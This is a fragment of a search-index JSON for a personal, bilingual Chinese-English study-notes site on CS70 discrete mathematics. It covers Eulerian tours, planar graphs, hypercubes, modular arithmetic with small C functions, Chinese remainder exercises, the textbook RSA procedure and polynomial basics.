<p>\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u6839\u636e\u9898\u610f\uff0c\u6211\u4eec\u6bcf\u6761\u8fb9\u90fd\u8981\u8d70\u4e14\u53ea\u8d70\u4e00\u904d</p> <ul> <li> <p>Only if :\u5982\u679c\u67d0\u4e2a\u7aef\u70b9\uff08\u975e\u8d77\u70b9\uff09\u6709\u5947\u6570\u6761\u8fb9\uff0c\u90a3\u603b\u4f1a\u6709\u90a3\u4e48\u4e00\u4e2a\u65f6\u523b\u8fdb\u53bb\u4e86\u51fa\u4e0d\u6765\uff1b\u5bf9\u4e8e\u8d77\u70b9\uff0c\u90a3\u5c31\u662f\u6709\u4e00\u4e2a\u65f6\u523b\u51fa\u53bb\u4e86\u6ca1\u6cd5\u8fdb\u6765\uff1b\u603b\u4e4b\u53cd\u8bc1\u6cd5\u53ef\u5f97</p> </li> <li> <p>if : \u6211\u4eec\u53ef\u4ee5\u6539\u4e3a\u8bc1\u660e FindTour(G, s)</p> </li> </ul> <p>FINDTOUR is very simple: In even degree graph, it just starts walking from a vertex s \u2208 V, at each step choosing any untraversed edge incident to the current vertex, until it gets stuck because there is no more adjacent untraversed edge.</p> <p>\u8bc1\u660e\u540c\u6837\u7b80\u5355\uff0c\u5982\u679c\u5361\u5728 t != s \u5904\uff0c\u90a3\u4e48\u8bf4\u660e\u8fdb\u51fa t \u7684\u6b21\u6570\u662f\u5947\u6570\uff0c\u8fd9\u4e0e even degree graph \u5b9a\u4e49\u76f8\u77db\u76fe\uff0c\u6545 t == s\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u5b9a\u4f1a\u8fd4\u56de\u539f\u70b9\u3002</p> <p>For more information such as algorithm EULER(G, s), you can visit Fleury's algorithm &amp; Hierholzer's algorithm</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iii-planarity-eulers-formula-coloring","title":"III Planarity, Euler\u2019s Formula, Coloring.","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iii1-tree","title":"III.1 Tree","text":"<p>Just like what we learn in Data Struct, so we pass it.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iii2-planar-graphs","title":"III.2 Planar Graphs","text":"<p>A graph is planar if it can be drawn on the plane without crossings.</p> <p>Just understand what \"can\" stands for since the first and second graphs below are the same, but drawn differently; the second drawing has crossings, the graph is still considered planar since it is possible to draw it without crossings.</p> <p></p> <p>The first one of them is the infamous \u201cthree houses-three wells graph,\u201d also called K3,3, (This notation says there are two sets of vertices, each of size three and all edges between the two sets of vertices are present.) The second is the \u201ccomplete\u201d graph (every edge is present) with five nodes, or K5. The third is the four-dimensional cube. We shall soon see how to prove that all three graphs are non-planar.</p> <p></p> <p>If we define graph's vertices (their number will be denoted v here) and edges (their number is e), the faces of the graph (more precisely, of the drawing). The faces are the regions into which the graph subdivides the plane, then goes Euler's formula:</p> <p>THEOREM 5.2 Euler's formula</p> <p>For every connected planar graph, v+ f = e+2</p> Proof by induction on e <p>It certainly holds when e = 0, and v = f = 1. Now take any connected planar graph. Two cases: </p> <p>\u2022 If it is a tree, then f = 1 (drawing a tree on the plane does not subdivide the plane), and e = v \u2212 1 (check homework). </p> <p>\u2022 If it is not a tree, find a cycle and delete any edge of the cycle. This amounts to reducing both e and f by one. By induction the formula is true in the smaller graph, and so it must be true in the original one.</p> <p>If we define  \\(s_i\\)  as the number  of edges of face_i, then we get that:</p> \\[ \\sum_{i=1}^f  s_i  = 2e \\] <p>It is easy to learn that  \\(s_i \\geq 3\\),  solving for f and plugging into Euler\u2019s formula we get e \u2264 3v\u22126.</p> <p>This is an important fact, which helps us to konw that  \\(K_{5}\\)  is not planar.</p> <p>What about  \\(K_{3,3}\\)  ?</p> <p>As we can see in  \\(K_{3,3}\\) , there is no triangle so  \\(s_i \\geq 4\\) , which turns out to be that: \\(e \u2264 2v\u22124\\), so  \\(K_{3,3}\\)  is not planar.</p> <p>This is made precise in the following famous result, due to the Polish mathematician Kuratowski (this is what \u201cK\u201d stands for)</p> <p>THEOREM 5.3</p> <p>A graph is non-planar iff it contains  \\(K_{5}\\)  or  \\(K_{3,3}\\) .</p> Proof <p>for a short proof you may want to type \u201cproof of Kuratowski\u2019s theorem\u201d in your favorite search engine</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv-important-classes-of-graphs","title":"IV Important classes of graphs","text":"<p>\u5c31\u50cf\u4e92\u8054\u7f51\u4e00\u6837\uff0c\u6211\u4eec\u5e0c\u671b\u4efb\u4f55\u4e00\u4e2a\u8282\u70b9\u90fd\u80fd\u591f\u8bbf\u95ee\u5230\u5176\u4f59\u4efb\u4f55\u4e00\u4e2a\u8282\u70b9\uff0c\u8fd9\u5c31\u8981\u6c42\u6211\u4eec\u7684\u56fe\u662f\u5f7c\u6b64\u8fde\u63a5\u7684\u3002\u4f46\u662f\u8fde\u63a5\u592a\u5c11\uff08\u5982 Trees \u6216\u8005 link\uff09\u4f1a\u5bfc\u81f4\u4e00\u5904\u8fde\u63a5\u4e2d\u65ad\u800c\u5927\u7247\u5931\u8054\uff1b\u8fde\u63a5\u8fc7\u591a\uff08\u5982\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u76f4\u63a5\u8fde\u63a5\u5176\u4ed6\u6240\u6709\u8282\u70b9\uff0c\u5373 Complete graphs\uff09\u53c8\u5728\u6210\u672c\u548c\u590d\u6742\u5ea6\u4e0a\u4e0d\u5207\u5b9e\u9645\uff1b\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5f88\u597d\u5730\u7ed3\u5408\u53cc\u65b9\u7279\u70b9\u7684\u56fe\u5f62\u7ed3\u6784\uff0c\u5373\u8d85\u7acb\u65b9\u4f53(hypercubes)\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u5c06\u4ecb\u7ecd\u4e09\u8005\uff0c\u4ee5 hypercubes \u4e3a\u4e3b\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv1-complete-graphs","title":"IV.1 Complete graphs","text":"<p>As we can see, complete graphs contain the maximum number of edges possible.</p> <p>Here, the notation Kn denotes the unique complete graph on n vertices.</p> <p>Formally, we can write Kn = (V,E) for |V| = n and E = {{vi , vj} | vi \u0338= vj and vi , vj \u2208 V} in undirected graphs.</p> <p></p> <p>Finally, we can also discuss complete graphs for directed graphs, which are defined as you might expect: For any pair of vertices u and v, both (u, v),(v,u) \u2208 E.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv2-trees","title":"IV.2 Trees","text":"<p>Formally, there are a number of equivalent definitions of when a graph G = (V,E) is a tree, including:</p> <ol> <li>G is connected and contains no cycles.</li> <li>G is connected and has n\u22121 edges (where n = |V|).</li> <li>G is connected, and the removal of any single edge disconnects G.</li> <li>G has no cycles, and the addition of any single edge creates a cycle.</li> </ol> <p></p> <p>In a rooted tree, there is a designated node called the root, which we think of as sitting at the top of the tree. The bottom-most nodes are called leaves, and the intermediate nodes are called internal nodes.</p> <p>Note that in a rooted tree, a root is never a leaf. In particular, this differs from an unrooted tree; in an unrooted tree, leaves are any vertex of degree 1.</p> <p>Then goes the same as what we learn in Data Struct, so we pass it.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv3-hypercubes","title":"IV.3 Hypercubes","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv31-definition","title":"IV.3.1 definition","text":"direct  definitions <p>The vertex set of the n-dimensional hypercube G = (V,E) is given by V = \\(\\{0,1\\}^{n}\\) , where recall \\(\\{0,1\\}^{n}\\) denotes the set of all n-bit strings. In other words, each vertex is labeled by a unique n-bit string, such as 00110\u00b7\u00b7\u00b70100. The edge set E is defined as follows: Two vertices x and y are connected by edge {x, y} if and only if x and y differ in exactly one bit position. </p> <p>For example, x = 0000 and y = 1000 are neighbors, but x = 0000 and y = 0011 are not.  More formally, x = x1x2 ... xn and y = y1y2 ... yn are neighbors if and only if there is an i \u2208 {1,...,n} such that \\(x_{j} = y_{j}\\) for all \\(j \\neq i\\), and \\(x_{i} \\neq y_{i}\\) . </p> <p>To help you visualize the hypercube, we depict the 1-, 2-, and 3-dimensional hypercubes below.</p> <p></p> <p>This kind of struct is useful in  Karnaugh map .</p> recursive definition <p>Define the 0-subcube (respectively, 1-subcube) as the (n\u22121)-dimensional hypercube with vertices labeled by 0x for x \u2208 {0,1} n\u22121 (respectively, 1x for x \u2208 {0,1} n\u22121 ). Then, the n-dimensional hypercube is obtained by placing an edge between each pair of vertices 0x in the 0-subcube and 1x in the 1-subcube.</p> <p>\u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u56fe\u4e00\u5230\u56fe\u4e8c\u6765\u7406\u89e3\uff1a</p> <p>\u5728\u56fe\u4e00\u4e2d\u6709\u4e24\u4e2a\u8282\u70b9\uff1a0 \u548c 1\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u4e0a\u9762\u6240\u8c13\u7684 x\uff0c\u6211\u4eec\u5728\u524d\u9762\u4e00\u4e00\u5206\u522b\u52a0\u4e0a 0 \u548c 1\uff0c\u4e5f\u5c31\u4e0a\u9762\u6240\u8c13\u7684 0 x\u30011 x \uff0c\u4e00\u5171\u4f1a\u51fa\u73b0\u4e86 4 \u4e2a\u8282\u70b9\uff1a00\u300101\uff1b10\u300111 \u3002\u4e14\u6211\u4eec\u5e94\u8be5\u5c06 0 x \u4e0e\u5bf9\u5e94\u7684 1x \u4e4b\u95f4\u52a0\u4e0a\u8fb9\uff0c\u8fd9\u6837\u6784\u6210\u4e86\u56fe\u4e8c</p> <p>\u540c\u7406\u7531\u56fe\u4e8c\u6784\u6210\u56fe\u4e09\uff0c\u9012\u5f52\u5b9a\u4e49</p> <p>We began this section by singing praises for the hypercube in terms of its connectivity properties; we now investigate these claims formally. Let us begin by giving two proofs of a simple property of the hypercube. ^^Each proof relies on one of our two equivalent (namely, direct and recursive) definitions of the hypercube.^^</p> <p>Lemma 5.1</p> <p>The total number of edges in an n-dimensional hypercube is \\(n*2^{n-1}\\) . </p> <p>proof 2 can be got by induction</p> <p>THEOREM 5.4</p> <p>Let S \u2286 V be such that |S| \u2264 |V \u2212S| (i.e., that |S| \u2264 2*n\u22121 ), and let ES denote the set of edges connecting S to V \u2212S, i.e., \\(\\(E_{S} := \\{\\{u, v\\} \u2208 E | u \u2208 S \\land v \u2208 V \u2212S\\}\\)\\)  Then, it holds that | \\(E_{S}\\) | \u2265 |S|.</p> Proof  (I haven't got it yet) <p>We proceed by induction on n. Base case (n = 1): The 1-dimensional hypercube graph has two vertices 0 and 1, and one edge {0,1}. We also have the assumption \\(|S| \u2264 2^1\u22121 = 1\\), so there are two possibilities. First, if |S| = 0, then the claim trivially holds. Otherwise, if |S| = 1, then S = {0} and V \u2212S = {1}, or vice versa. In either case we have ES = {0,1}, so |ES| = 1 = |S|. Inductive hypothesis: Assume the claim holds for 1 \u2264 n \u2264 k. Inductive step: We prove the claim for n = k + 1. Recall that we have the assumption \\(|S| \u2264 2^k\\) . Let S0 (respectively, S1) be the vertices from the 0-subcube (respectively, 1-subcube) in S. We have two cases to examine: Either S has a fairly equal intersection size with the 0- and 1-subcubes, or it does not. </p> <ul> <li>Case 1: \\(|S_{0}| \u2264 2^{k-1}\\) and \\(|S_{1}| \u2264 2^{k-1}\\) .</li> </ul> <p>In this case, we can apply the induction hypothesis separately to the 0- and 1-subcubes. This says that restricted to the 0-subcube itself, there are at least |S0| edges between |S0| and its complement (in the 0-subcube), and similarly there are at least |S1| edges between |S1| and its complement (in the 1-subcube). Thus, the total number of edges between S and V \u2212S is at least |S0|+|S1| = |S|, as desired. 2. </p> <ul> <li>Case 2: \\(|S_{0}| &gt; 2^{k-1}\\) </li> </ul> <p>In this case, S0 is unfortunately too large for the induction hypothesis to apply. However, note that since |S| \u2264 2 k , we have |S1| = |S|\u2212|S0| \u2264 2 k\u22121 , so we can apply the hypothesis to S1. As in Case 1, this allows us to conclude that there are at least |S1| edges in the 1-subcube crossing between S and V \u2212S. What about the 0-subcube? Here, we cannot apply the induction hypothesis directly, but there is a way to apply it after a little massaging. Consider the set V0 \u2212S0, where V0 is the set of vertices in the 0-subcube. Note that |V0| = 2 k and \\(|V_{0} \u2212S_{0}| = |V_{0}|\u2212|S_0| = 2^k \u2212|S_{0}| &lt; 2^k \u22122^{k\u22121} = 2^{k\u22121}\\) . Thus, we can apply the inductive hypothesis to the set V0 \u2212 S0. This yields that the number of edges between S0 and V0 \u2212S0 is at least 2k \u2212 |S0|. Adding our totals for the 0-subcube and the 1-subcube so far, we conclude there are at least 2k \u2212 |S0|+|S1| crossing edges between S and V \u2212S. However, recall our goal was to show that the number of crossing edges is at least |S|; thus, we are still short of where we wish to be. But there are a still edges we have not accounted for \u2014 namely, those in ES which cross between the 0- and 1-subcubes. Since there is an edge between every vertex of the form 0x and the corresponding vertex 1x, we conclude there are at least |S0| \u2212 |S1| edges in ES that cross between the two subcubes. Thus, the total number of edges crossing is at least \\(2^k \u2212|S0|+|S1|+|S0| \u2212|S1| = 2^k \u2265 |S|\\), as desired.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/05-Graph_Theory/#iv32-de-bruijn-sequence","title":"IV.3.2 de Bruijn sequence","text":"<p>A de Bruijn sequence is a 2n -bit circular sequence such that every string of length n occurs as a contiguous substring of the sequence exactly once.</p> <p>For example, the following is a de Bruijn sequence for the case n = 3:</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/06-Modular_Arithmetic/","title":"06 Modular Arithmetic","text":"<p>note 6 \u8bb2\u7684\u5c31\u662f\u6a21\u6570\u548c\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff0c\u8fd9\u91cc\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e9b\u6bd4\u8f83\u5c11\u8bb2\u89e3\u5230\u7684\u77e5\u8bc6\u70b9\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/06-Modular_Arithmetic/#i-introduction","title":"I Introduction","text":"<ol> <li> <p>\u6a21\u8fd0\u7b97\uff1a</p> <ul> <li>\u6982\u5ff5\u548c\u6027\u8d28\uff1a\u6a21\u8fd0\u7b97\u5c06\u6570\u503c\u9650\u5236\u5728\u9884\u5b9a\u4e49\u7684\u8303\u56f4{0,1,\u2026,N-1}\u5185\uff0c\u5f53\u6570\u503c\u8d85\u8fc7\u8303\u56f4\u65f6\uff0c\u4f1a\u201c\u5faa\u73af\u201d\u56de\u5230\u8303\u56f4\u8d77\u59cb\u3002</li> <li>\u8fd0\u7b97\u89c4\u5219\uff1a\u6a21\u8fd0\u7b97\u4e0b\u7684\u52a0\u6cd5\u3001\u51cf\u6cd5\u548c\u4e58\u6cd5\u89c4\u5219\u3002</li> <li>\u5e94\u7528\u573a\u666f\uff1a\u4f8b\u5982\u65f6\u949f\u768412\u5c0f\u65f6\u5faa\u73af\u3001\u4e00\u5468\u76847\u5929\u5faa\u73af\u7b49</li> <li>\u6027\u8d28 \uff1aIf a \u2261 c (mod m) and b \u2261 d (mod m), then a+b \u2261 c+d (mod m) and a\u00b7b \u2261 c\u00b7d (mod m)  2. \u5e42\u8fd0\u7b97\uff1a</li> <li>\u5e42\u8fd0\u7b97\u5b9a\u4e49\uff1a\u8ba1\u7b97xy (mod m)\uff0c\u5176\u4e2dx,y,m\u662f\u81ea\u7136\u6570\uff0cm&gt;0\u3002</li> <li>\u91cd\u590d\u5e73\u65b9\u7b97\u6cd5\uff1a\u5229\u7528\u91cd\u590d\u5e73\u65b9\u7b97\u6cd5\u9ad8\u6548\u8ba1\u7b97\u5e42\u8fd0\u7b97\u3002\u8be5\u7b97\u6cd5\u5229\u7528y\u53ef\u4ee5\u8868\u793a\u4e3a2\u7684\u5e42\u6b21\u5f62\u5f0f\uff0c\u5373y=2^a\u6216y=2^a+1\uff0c\u5e76\u5229\u7528x^2^a=(x^a)^2\u548cx^2^a+1=x(x^a)^2\u7684\u6027\u8d28\uff0c\u901a\u8fc7\u9012\u5f52\u5b9e\u73b0\u5feb\u901f\u5e42\u8fd0\u7b97\u3002\u7b97\u6cd5\u590d\u6742\u5ea6\u4e3aO(n)\uff0c\u5176\u4e2dn\u662fy\u7684\u4f4d\u6570\u3002 3. \u6a21\u8fd0\u7b97\u9664\u6cd5*</li> </ul> </li> </ol> <p>Question</p> <p>8x \u2261 9 (mod 15). \u89e3\u6574\u6570 x</p> <p>\u4e24\u8fb9\u540c\u9664 8\uff1fx \u2261 9/8 (mod 15) \u770b\u8d77\u6765\u4e00\u5934\u96fe\u6c34</p> <p>\u4f46\u662f\u6211\u4eec\u60f3\u8981\u7684\u4e0d\u5c31\u662f x \u2261 \u6574\u6570 (mod 15) \u561b\uff0c\u5de6\u8fb9\u5982\u4f55\u53d8\u6210\u8fd9\u6837\u5462\uff1f\u8003\u8651\u6a21\u6570\u7684\u5faa\u73af\u6027\uff0c\u6211\u4eec\u53ea\u8981\u5de6\u53f3\u4e24\u4fa7\u540c\u4e58 x \u7cfb\u6570\u7684\u9006\u5143 \u5373\u53ef\uff0c\u5373 2\uff0c\u90a3\u4e48\u5c31\u6709</p> <p><code>x \u2261 16 x \u2261 18 \u2261 3 (mod 15).</code></p> <p>\u6211\u4eec\u4e00\u822c\u8ba4\u4e3a x \u5e94\u8be5\u5c0f\u4e8e\u6a21\u6570 15\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u552f\u4e00\u7684\uff0c\u5373 3</p> <ol> <li>\u4e58\u6cd5\u9006\u5143\uff1a<ul> <li>\u5b9a\u4e49\uff1a\u82e5 gcd(x,m)=1\uff0c\u5219 x \u5728\u6a21 m \u4e0b\u5b58\u5728\u552f\u4e00\u9006\u5143 x^(-1)\u4f7f\u5f97 x*x^(-1)\u22611(mod m)\u3002</li> <li>\u6761\u4ef6\uff1a\u53ea\u6709\u4e0em\u4e92\u8d28\u7684\u6574\u6570\u624d\u6709\u4e58\u6cd5\u9006\u5143</li> <li>\u8ba1\u7b97\uff1a\u4f7f\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u8ba1\u7b97\u4e58\u6cd5\u9006\u5143\u3002\u8be5\u7b97\u6cd5\u662f\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u7684\u6269\u5c55\uff0c\u4e0d\u4ec5\u80fd\u8ba1\u7b97gcd(x,m)\uff0c\u8fd8\u80fd\u627e\u5230\u6574\u6570a\u548cb\uff0c\u4f7f\u5f97gcd(x,m)=ax+bm\u3002\u5f53gcd(x,m)=1\u65f6\uff0cb\u5373\u4e3ax\u7684\u4e58\u6cd5\u9006\u5143\u3002</li> </ul> </li> <li> <p>\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u4e0e\u552f\u4e00\u5206\u89e3\u5b9a\u7406\uff1a ^a22607</p> <ul> <li>\u5173\u7cfb\uff1a\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u4e0e\u552f\u4e00\u5206\u89e3\u5b9a\u7406\u4e4b\u95f4\u7684\u5173\u7cfb\u3002</li> <li>\u8bc1\u660e\uff1a\u4f7f\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u8bc1\u660e\u552f\u4e00\u5206\u89e3\u5b9a\u7406\u3002\u552f\u4e00\u5206\u89e3\u5b9a\u7406\u8868\u660e\u4efb\u4f55\u6b63\u6574\u6570n\u90fd\u53ef\u4ee5\u552f\u4e00\u5206\u89e3\u4e3a\u8d28\u6570\u7684\u4e58\u79ef\u3002\u8bc1\u660e\u7684\u5173\u952e\u5728\u4e8e\u5229\u7528\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u7684\u6027\u8d28\uff0c\u5373gcd(x,y) = gcd(y,x mod y)\u3002\u901a\u8fc7\u9012\u5f52\u5730\u4f7f\u7528\u8be5\u6027\u8d28\uff0c\u53ef\u4ee5\u8bc1\u660e\u552f\u4e00\u5206\u89e3\u5b9a\u7406\u3002</li> </ul> </li> <li> <p>\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff1a</p> <ul> <li>\u539f\u7406\uff1a</li> <li>\u4e00\u4e2a\u597d\u7684\u53d6 b_i \u7684\u65b9\u6cd5\u662f \\(b_{i} = \\prod_{j\\neq i}n_{j}\\) </li> <li>\u552f\u4e00\u89e3\uff1a\u5bf9\u4e8e\u4e92\u8d28\u7684\u6a21 n1,n2,\u2026,nk\uff0c\u7ed9\u51fa\u6ee1\u8db3\u591a\u4e2a\u540c\u4f59\u65b9\u7a0b\u7684\u552f\u4e00\u89e3\u3002\u5229\u7528\u4e58\u6cd5\u9006\u5143\uff0c\u6784\u9020\u89e3 x = a1_b1 + a2_b2 + \u2026 + ak*bk\uff0c\u5176\u4e2d bi = N/ni * (N/ni)^(-1)(mod ni)\uff0cN \u662f\u6240\u6709\u6a21\u7684\u4e58\u79ef\u3002\u8be5\u89e3\u662f\u552f\u4e00\u5b58\u5728\u7684\uff0c\u4e14\u53ef\u4ee5\u901a\u8fc7\u6a21\u8fd0\u7b97\u7684\u5206\u914d\u5f8b\u8bc1\u660e\u5176\u6b63\u786e\u6027\u3002</li> </ul> </li> </ol> <p>\u4e00\u4e9b\u5728\u7a0b\u5e8f\u4e0a\u7684\u7b97\u6cd5</p> \u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u6700\u5927\u516c\u56e0\u6570<pre><code>int gcd(int m, int n)\n{\n\u00a0 \u00a0 if (m == n)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 return m;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 else if (m &lt; n)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 int t = m;\n\u00a0 \u00a0 \u00a0 \u00a0 m = n;\n\u00a0 \u00a0 \u00a0 \u00a0 n = t;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 while (n != 0)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 int re = m % n;\n\u00a0 \u00a0 \u00a0 \u00a0 m = n;\n\u00a0 \u00a0 \u00a0 \u00a0 n = re;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 return m;\n}\n</code></pre> \u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\u6c42\u5e42<pre><code>double Pow(double x, int a)\n{\n\u00a0 \u00a0 if (a == 0)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 return 1;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 else if (a == 1)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 return x;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 if (a % 2 == 0)\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 return Pow(x * x, a / 2);\n\u00a0 \u00a0 }\n\u00a0 \u00a0 else\n\u00a0 \u00a0 {\n\u00a0 \u00a0 \u00a0 \u00a0 return Pow(x * x, a / 2) * x;\n\u00a0 \u00a0 }\n}\n</code></pre>","tags":["DMPT","notes"]},{"location":"note/cs70/06-Modular_Arithmetic/#ii-practices","title":"II Practices","text":"<p>Q 1 Celebrate and Remember Textiles</p> <p>\u539f\u9898\u5341\u5206\u5570\u55e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u89e3\u91ca\u7248\u672c</p> <p>\u89e3\u65b9\u7a0b\uff08\u6c42\u6700\u5c0f\u6b63\u6574\u6570X\uff09</p> \\[\\begin{cases} x\\equiv 4(mod 7) \\\\ x\\equiv 2(mod 4) \\\\ x\\equiv 2(mod 5) \\end{cases}\\] <p>\u6cd5\u4e00\uff1a\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406</p> <p>\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <p></p> <p>\u6cd5\u4e8c\uff1a\u6211\u4eec\u4f7f\u7528\u7f16\u7a0b\u6765\u904d\u5386\u6240\u6709\u53ef\u80fd</p> <p></p> <p>\uff08\u5f53\u7136\u5c06\u4e09\u4e2a\u6761\u4ef6\u7528 <code>and</code> \u8fde\u63a5\u653e\u4e00\u8d77\u4e5f\u53ef\u4ee5 \uff09</p> <p>Q 2 Euler\u2019s Totient Theorem</p> <p>\u5728 cryus \u7684\u7b14\u8bb0 \u4e2d\u8bb2\u89e3\u5f97\u5f88\u6e05\u695a\u4e86</p> <p>Q 3 Sparsity of Primes</p> <p>Prove that for any positive integer k, there exists k consecutive positive integers such that none of them are prime powers.</p> <p>\u8fd0\u7528\u5047\u8bbe\u6cd5\uff1a</p> <p>\u56de\u987e\u6211\u4eec\u4e0a\u9762\u8bb2\u5230\u7684</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4efb\u4f55\u4e00\u4e2a\u5408\u6570\u81f3\u5c11\u53ef\u4ee5\u5206\u89e3\u6210\u4e24\u4e2a\u8d28\u6570\u4e4b\u4e58\u79ef\uff1b\u5982\u679c\u8fd9\u4e2a\u6570\u4e0d\u662f\u8d28\u6570\u5e42\uff0c\u90a3\u4e48\u6211\u4eec\u603b\u80fd\u627e\u5230\u4e24\u4e2a\u4e0d\u540c\u7684\u8d28\u6570 \\(q_{i 1} \\neq q_{i 2}\\) \u4f7f\u5f97 \\(n+i \\equiv (mod\\quad q_{i 1}*q_{i 2})\\) \uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7406\u89e3\u4e0b\u9762\u7684\u89e3\u7b54\u4e86</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/07-Public_Key_Cryptography/","title":"07 Public Key Cryptography","text":"<p>In this note, we discuss a very nice and important application of modular arithmetic: the RSA public-key cryptosystem , named after its inventors Ronald Rivest, Adi Shamir and Leonard Adleman.</p> <p>\u55ef\u2026\u2026\u8fd9\u4e2a RSA \u6211\u5728\u5c1d\u8bd5 CTF \u89e3\u9898\u65f6\u770b\u8fc7 cyrus \u7684\u8bb2\u89e3 \uff0c\u6709\u5174\u8da3\u81ea\u884c\u89c2\u770b\uff1b\u540c\u65f6\u53ef\u4ee5\u5b66\u4e60\u4e00\u4e0b\u5176 python \u5b9e\u73b0\u3002</p> <p>\u4e0b\u9762\u662f RSA \u7684\u57fa\u672c\u8fc7\u7a0b</p> <ol> <li>\u5bc6\u94a5\u751f\u6210\uff1a<ul> <li>\u9009\u62e9\u4e24\u4e2a\u5927\u8d28\u6570\u00a0p\u00a0\u548c\u00a0q\u3002</li> <li>\u8ba1\u7b97\u6a21\u6570\u00a0n\uff1an=p\u00d7q\uff0c\u8fd9\u5c06\u662f\u516c\u94a5\u548c\u79c1\u94a5\u7684\u4e00\u90e8\u5206\u3002</li> <li>\u8ba1\u7b97\u6b27\u62c9\u51fd\u6570\u00a0\u03d5(n)\uff1a\u03d5(n)=(p\u22121)(q\u22121)\u3002</li> <li>\u9009\u62e9\u52a0\u5bc6\u6307\u6570\u00a0e\uff1a\u9009\u62e9\u4e00\u4e2a\u4e0e\u00a0\u03d5(n)\u00a0\u4e92\u8d28\u7684\u6574\u6570\u00a0e\uff0c\u901a\u5e38\u9009\u62e9\u4e00\u4e2a\u8f83\u5c0f\u7684\u8d28\u6570\u3002</li> <li>\u8ba1\u7b97\u89e3\u5bc6\u6307\u6570\u00a0d\uff1a\u627e\u5230\u4e00\u4e2a\u6574\u6570\u00a0d\uff0c\u4f7f\u5f97 e\u00d7d\u22611mod\u03d5(n)\u3002\u8fd9\u91cc\u00a0d\u00a0\u662f\u00a0e\u00a0\u5173\u4e8e\u6a21\u00a0\u03d5(n)\u00a0\u7684\u4e58\u6cd5\u9006\u5143\uff0c\u5373 \\(de \\equiv 1 (mod\\quad \\phi (n))\\) </li> <li>\u516c\u94a5 \u4e3a(e,n)\uff0c\u79c1\u94a5 \u4e3a\u00a0(d,n)\u3002</li> </ul> </li> <li>\u52a0\u5bc6\u8fc7\u7a0b\uff1a<ul> <li>\u5bf9\u4e8e\u8981\u52a0\u5bc6\u7684\u6d88\u606f\u00a0m\uff08\u4e00\u4e2a\u5c0f\u4e8e\u00a0n\u00a0\u7684\u6574\u6570\uff09\uff0c\u8ba1\u7b97\u5bc6\u6587\u00a0c\uff1a\\(c=m^{e}\\quad mod\\quad n\\)\u3002</li> </ul> </li> <li>\u89e3\u5bc6\u8fc7\u7a0b\uff1a<ul> <li>\u4f7f\u7528\u79c1\u94a5\u00a0(d,n)\u00a0\u6765\u89e3\u5bc6\u5bc6\u6587\u00a0c\uff0c\u8ba1\u7b97\u539f\u59cb\u6d88\u606f\u00a0m\uff1a\\(m=c^{d}\\quad mod\\quad n\\)\u3002</li> </ul> </li> </ol>","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/","title":"08 Polynomials","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/#i-introduction","title":"I Introduction","text":"<p>\u5bf9\u4e8e\u591a\u9879\u5f0f\u6211\u4eec\u4e86\u89e3\u4e0d\u5c11\uff0c\u53ea\u63d0\u4e24\u4e2a\u6027\u8d28</p> <ul> <li>n \u6b21\u591a\u9879\u5f0f\u81f3\u591a\u6709 n \u4e2a\u6839\uff1b</li> <li>\u7ed9\u5b9a\u6a2a\u5750\u6807\u4e92\u5f02\u7684 n+1 \u4e2a\u5b9a\u70b9\u80fd\u591f\u552f\u4e00\u786e\u8ba4 n \u6b21\u591a\u9879\u5f0f\u3002</li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/08-Polynomials/#ii-polynomial-interpolation","title":"II Polynomial Interpolation","text":"<p>Wiki</p> 